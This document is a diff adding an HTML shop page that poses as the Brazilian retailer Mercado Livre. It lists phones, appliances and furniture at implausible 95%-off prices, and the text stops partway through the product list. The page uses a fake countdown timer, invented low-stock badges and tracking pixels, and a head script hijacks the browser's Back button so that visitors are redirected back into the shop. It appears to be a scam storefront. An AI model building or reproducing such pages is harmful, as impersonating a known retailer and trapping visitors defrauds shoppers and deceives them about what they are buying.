@@ -1,0 +1,845 @@
+<html lang="pt-br">
+
+<head>
+   
+<script>
+  window.pixelId = "6859f415ef400383797fc6bc";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+  <script>
+  
+  const link ='./index.html';
+
+  function setBackRedirect(url) {
+    let urlBackRedirect = url;
+    urlBackRedirect = urlBackRedirect =
+      urlBackRedirect.trim() +
+      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+      document.location.search.replace('?', '').toString();
+
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    window.addEventListener('popstate', () => {
+      console.log('onpopstate', urlBackRedirect);
+      setTimeout(() => {
+        location.href = urlBackRedirect;
+      }, 1);
+    });
+  }
+
+  setBackRedirect(link);
+</script>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Mercado Livre</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="icon" href="images/favicon.png">
+    <link rel="shortcut icon" href="images/favicon.png">
+    <link rel="stylesheet" href="css/products.css">
+    <link rel="stylesheet" href="css/styles2.css">
+    <link rel="stylesheet" href="css/fonts.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,1,0">
+    <style>
+      .free-shipping-container {
+        margin-bottom: 6px;
+      }
+
+      .estoque {
+        font-size: 10pt;
+        padding: 3px;
+      }
+
+      .estoque-verde {
+        color: rgb(0, 132, 18);
+        background-color: #CBFFC7;
+      }
+
+      .estoque-amarelo {
+        color: rgb(132, 121, 0);
+        background-color: #ffffc7;
+      }
+
+      .estoque-vermelho {
+        color: rgb(255, 46, 46);
+        background-color: #FFDCDC;
+      }
+
+      .product-name {
+        margin-top: 5px;
+      }
+    </style>
+<meta charset="utf-8">
+
+ </head>
+  <body>
+    <div style="background-color: #e6cf00; text-align: center; padding: 5px; font-family: 'GellixMedium'; font-size: 13px; color: white">Aproveite 95% de desconto aplicado automaticamente na sua compra!</div>
+    <nav class="navbar" style="padding-top: 15px;">
+      <div class="menu-icon" style="padding-left: 3%;">
+        <img src="images/logo.webp" style="height: 5vh;" alt="Logo Central Vivara">
+      </div>
+      <div class="logo-central"></div>
+      <div class="menu-icon" style="padding-right: 3%;">
+        <span class="material-symbols-outlined" style="font-size: 30px; padding-right: 10px; color: black">menu</span>
+      </div>
+    </nav>
+    <img src="images/BANNER-MELI-EDIT.webp?v=4" style="width: 100%; margin-top: -2px;" alt="Banner Roleta de Prêmios">
+    <div style="
+width: 90%;
+margin: 10px auto;
+border-radius: 8px;
+background: linear-gradient(to right, #011E51, #a52aad);
+padding: 10px;
+color: #fff;
+font-family: 'GellixMedium';
+text-align: center;
+">
+<!-- Texto e Timer dentro do banner roxo -->
+Oferta Disponível
+<span style="font-size: 12px;">
+  Tempo restante: <span id="countdown">03:42:40 </span>
+</span>
+</div>
+
+<script>
+  let countdownTime = 3 * 60 * 60 + 42 * 60 + 40; 
+
+  function updateCountdown() {
+    const hours = Math.floor(countdownTime / 3600);
+    const minutes = Math.floor((countdownTime % 3600) / 60);
+    const seconds = countdownTime % 60;
+
+    document.getElementById("countdown").textContent = 
+      `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')} `;
+
+    if (countdownTime > 0) {
+      countdownTime--;
+    } else {
+      clearInterval(countdownInterval);
+      document.getElementById("countdown").textContent = "00:00:00"; 
+    }
+  }
+
+  const countdownInterval = setInterval(updateCountdown, 1000);
+
+  document.addEventListener('click', event => {
+    const productCard = event.target.closest('.bracelet-item');
+    if (productCard) sessionStorage.setItem('loja-scroll-y', String(window.scrollY));
+  }, true);
+
+  if ('scrollRestoration' in history) history.scrollRestoration = 'manual';
+
+  window.addEventListener('pageshow', () => {
+    const savedScroll = sessionStorage.getItem('loja-scroll-y');
+    if (savedScroll === null) return;
+    sessionStorage.removeItem('loja-scroll-y');
+    requestAnimationFrame(() => window.scrollTo({ top: Number(savedScroll), left: 0, behavior: 'auto' }));
+  });
+</script>
+    <div class="bracelet-grid">
+      <div class="bracelet-item" onclick="window.location.href = './produtos/jbl/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'JBL Boombox 3'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/poco_preto.png" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 2.999,90</div>
+          <span class="new-price">R$ 67,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 6 unidades</span>
+          <p class="product-name">JBL Boombox 3 <span style="font-family: 'GellixBold';">Preta</span>
+            </p>
+            <p></p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/jbl2/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'Samsung The Freestyle Projetor Smart Portátil'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/poco-branco.webp" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 3.599,00</div>
+          <span class="new-price">R$ 97,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-verde">Restam 19 unidades</span>
+          <p class="product-name">JBL Partybox 710<span style="font-family: 'GellixBold';"> Preta</span>
+          </p><p></p>
+
+
+</div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/iphone16promax/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'JBL Partybox 710'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/iphon1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 12.895,00</div>
+          <span class="new-price">R$ 257,00</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-amarelo">Restam 8 unidades</span>
+          <p class="product-name">iPhone 16 Pro Max (1T) <span style="font-family: 'GellixBold';">Titânio Preto</span>
+        </p></div>
+
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/xiaomipocox5/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'Xiaomi Redmi Note 14 Pro 5G'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/lavar1.webp" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 2.855,99</div>
+          <span class="new-price">R$ 135,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-verde">Restam 10 unidades</span>
+          <p class="product-name">Xiaomi Redmi Note 14 Pro 5g 12RAM <span style="font-family: 'GellixBold';">512gb</span>
+        </p></div> 
+
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/geladeira/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/geladeira1.png" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 3.999,00</div>
+          <span class="new-price">R$ 355,00</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 3 unidades</span>
+          <p class="product-name">Geladeira Brastemp 588 Litros Inox 220V <span style="font-family: 'GellixBold';">Inox 220V</span>
+          </p>
+          <p></p>
+        </div>
+
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/geladeira2/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/Ttzhwy-Vmyt1j.webp" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 6.455,90</div>
+          <span class="new-price">R$ 420,00</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-verde">Restam 15 unidades</span>
+          <p class="product-name">Geladeira Brastemp Frost Free French Door 554 Litros 220V <span style="font-family: 'GellixBold';">Duas porta </span>
+          </p>
+          <p></p>
+        </div>
+
+     
+    </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/xiaomipocox5/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'JBL Flip 6'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/x1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 1.685,00</div>
+          <span class="new-price">R$ 87,00</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-verde">Restam 14 unidades</span>
+          <p class="product-name">Xiaome POCO X5 256GB <span style="font-family: 'GellixBold';">Blue</span>
+        </p></div>
+         </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/galaxys25ultra/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'Apple Watch Series 9'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/s1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 5.850,90</div>
+          <span class="new-price">R$ 98,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 5 unidades</span>
+          <p class="product-name">Samsung Galaxy S25 Ultra 5G, 512GB, Câmera Quádrupla<span style="font-family: 'GellixBold';">Titânio Preto</span>
+          </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/fogao/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/p3.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 3.739,99</div>
+          <span class="new-price">R$ 255,00</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 07 unidades</span>
+          <p class="product-name">Fogão 5 Bocas Preto A Gás Com Mesa <span style="font-family: 'GellixBold';">Inox Atlas Mônaco</span>
+          </p>
+          <p></p>
+        </div>
+              </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/airfreyer/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/f1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 529,99</div>
+          <span class="new-price">R$ 110,00</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 7 unidades</span>
+          <p class="product-name">Fritadeira Air Fryer Oven Mondial <span style="font-family: 'GellixBold';">2 em 1</span>
+          </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/tv/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/w.webp" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 2.999,99</div>
+          <span class="new-price">R$ 285,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-amarelo">Restam 12 unidades</span>
+          <p class="product-name">Samsung Smart Tv 55 Polegadas <span style="font-family: 'GellixBold';">Qled 4k 2024</span>
+          </p>
+          <p></p>
+        </div>
+
+                      </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/tablet/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/x1-2.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 2.512,00</div>
+          <span class="new-price">R$ 65,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 6 unidades</span>
+          <p class="product-name">Tablet Xiaomi Redmi Pad Pro 12.1 8gb  <span style="font-family: 'GellixBold';">256gb</span>
+          </p>
+        </div>
+                              </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/xiaomipocox6/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/x1-1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 2.112,00</div>
+          <span class="new-price">R$ 87,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 9 unidades</span>
+          <p class="product-name">Xiaomi Poco X6 Pro 8gb Ram 256gb <span style="font-family: 'GellixBold';">Cor Preto</span>
+          </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/iphone15promax/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro Max'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/iphone_15_pro_max_titanio_preto.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 6.199,00</div>
+          <span class="new-price">R$ 134,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 8 unidades</span>
+          <p class="product-name">iPhone 15 Pro Max (512GB) <span style="font-family: 'GellixBold';">Titânio Preto</span>
+          </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/jogodepanelas/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/p1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 1.099,99</div>
+          <span class="new-price">R$ 89,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-verde">Restam 14 unidades</span>
+          <p class="product-name">Jogo De Panelas Vanilla 10pçs Indução <span style="font-family: 'GellixBold';">Antiaderente Brinox</span>
+          </p>
+          <p></p>
+        </div>
+        </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/pressao/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/s1-1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$299,00</div>
+          <span class="new-price">R$ 55,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-verde">Restam 18 unidades</span>
+          <p class="product-name">Kit 3 Panela Pressão 7 Litros 4,5 Litros 2,5 Litros Craqueado <span style="font-family: 'GellixBold';">Preta</span>
+          </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/iphone15/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/iphone_15_rosa.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 5.849,10</div>
+          <span class="new-price">R$ 125,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 6 unidades</span>
+          <p class="product-name">iPhone 15 (256GB) <span style="font-family: 'GellixBold';">Rosa</span>
+          </p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/iphone15azul/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/iphone_15_pro_max_titanio_branco.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 5.849,10</div>
+          <span class="new-price">R$ 125,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 7 unidades</span>
+          <p class="product-name">iPhone 15 (256GB) <span style="font-family: 'GellixBold';">Azul</span>
+          </p>
+        </div>
+
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/ar/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'JBL Partybox 710'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/ar1.webp" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 2.299,00</div>
+          <span class="new-price">R$ 299,00</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-verde">Restam 11 unidades</span>
+          <p class="product-name">Ar Condicionado Split LG <span style="font-family: 'GellixBold';">24000 B</span>
+        </p></div>
+
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/kit7ferramentas/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'Apple Watch Series 9'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/78c73f4b-fafb-4b43-b17f-3ac292f7b254.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 1.050,90</div>
+          <span class="new-price">R$ 95,65</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-amarelo">Restam 8 unidades</span>
+          <p class="product-name">Kit Combinado de 7 Ferramentas <span style="font-family: 'GellixBold';">DEWALT</span>
+          </p>
+        </div>
+
+        </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/guardaroupa/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/c-OWN5-Qgl1-Udq19a-Q69-Gdk-EQNaz2-ALIpigvb-UYhz9.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 1.049,05</div>
+          <span class="new-price">R$ 114,60</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-verde">Restam 18 unidades</span>
+          <p class="product-name">Guarda-roupa casal Easy Slim <span style="font-family: 'GellixBold';">com Espelho</span>
+          </p>
+          <p></p>
+        </div>
+        </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/mesinha/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/ivbmh-Ts61-Oc9-Sjwa-Zr-Vhd-AMa2-F4-Uzq0-Ouys-Xn-MCS-1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 559,00</div>
+          <span class="new-price">R$ 57,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-verde">Restam 18 unidades</span>
+          <p class="product-name">Mesinha Penteadeira Camarim Com Organizador Maquiagem Espelho Cor <span style="font-family: 'GellixBold';">Branco</span>
+          </p>
+          <p></p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/lavadora/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/faz-Kg-QWr-Ay-Jzk-OW76-Ar-Uzn-Xzzzo-Qkd-Yxe58ltc-Yr.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 699,00</div>
+          <span class="new-price">R$ 88,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 3 unidades</span>
+          <p class="product-name">Lavadora De Alta Pressão Kärcher K2 <span style="font-family: 'GellixBold';">Plus</span>
+          </p>
+        </div>
+
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/camera/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/iphone_15_pro_titanio.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 355,00</div>
+          <span class="new-price">R$ 49,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 4 unidades</span>
+          <p class="product-name">Kit 2câmera Ip Icsee Prova D'água Infravermelho Externa Wifi <span style="font-family: 'GellixBold';">Segurança</span>
+          </p>
+          <p></p>
+        </div>
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/microondas/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/m1.webp" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 1.757,99</div>
+          <span class="new-price">R$ 102,16</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 04 unidades</span>
+          <p class="product-name">Microondas Brastemp 38L <span style="font-family: 'GellixBold';">Inox</span>
+          </p>
+        </div>
+
+
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/cafeteiraportatil/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/c1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 469,00</div>
+          <span class="new-price">R$ 87,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-verde">Restam 18 unidades</span>
